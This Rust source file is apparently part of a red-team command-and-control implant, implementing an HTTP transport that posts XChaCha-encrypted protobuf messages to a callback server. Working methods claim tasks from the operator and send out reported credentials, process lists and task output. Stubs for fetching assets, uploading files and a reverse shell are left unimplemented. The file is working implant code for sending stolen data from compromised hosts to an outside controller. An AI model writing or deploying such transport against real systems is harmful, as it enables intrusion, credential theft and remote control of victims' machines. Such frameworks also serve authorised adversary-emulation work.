use crate::Transport;
use anyhow::{Context, Result};
use hyper::StatusCode;
use pb::c2::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

// Marshal: Encode and encrypt a message using the ChachaCodec
// Uses the helper functions exported from pb::xchacha
fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
}

// Unmarshal: Decrypt and decode a message using the ChachaCodec
fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::decode_with_chacha::<Req, Resp>(data)
}

#[derive(Debug, Clone)]
pub struct HTTP {
    client: hyper::Client<hyper::client::HttpConnector>,
    base_url: String,
}

impl Transport for HTTP {
    fn init() -> Self {
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false);
        connector.set_nodelay(true);
        let client = hyper::Client::builder().build(connector);
        HTTP {
            client,
            base_url: String::new(),
        }
    }

    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        // Create HTTP connector
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false); // Allow HTTPS
        connector.set_nodelay(true); // TCP optimization

        // Build HTTP client
        let client = hyper::Client::builder().build(connector);

        Ok(Self {
            client,
            base_url: callback,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        // Marshal: Encode and encrypt the request using the codec
        let request_bytes = marshal_with_codec::<ClaimTasksRequest, ClaimTasksResponse>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, CLAIM_TASKS_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg =
            unmarshal_with_codec::<ClaimTasksRequest, ClaimTasksResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        unimplemented!("todo")
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        // Marshal: Encode and encrypt the request using the codec
        let request_bytes =
            marshal_with_codec::<ReportCredentialRequest, ReportCredentialResponse>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, REPORT_CREDENTIAL_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg =
            unmarshal_with_codec::<ReportCredentialRequest, ReportCredentialResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        unimplemented!("todo")
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        // Marshal: Encode and encrypt the request using the codec
        let request_bytes =
            marshal_with_codec::<ReportProcessListRequest, ReportProcessListResponse>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, REPORT_PROCESS_LIST_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg =
            unmarshal_with_codec::<ReportProcessListRequest, ReportProcessListResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        // Marshal: Encode and encrypt the request using the codec
        let request_bytes =
            marshal_with_codec::<ReportTaskOutputRequest, ReportTaskOutputResponse>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, REPORT_TASK_OUTPUT_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg =
            unmarshal_with_codec::<ReportTaskOutputRequest, ReportTaskOutputResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        unimplemented!("todo")
    }
}
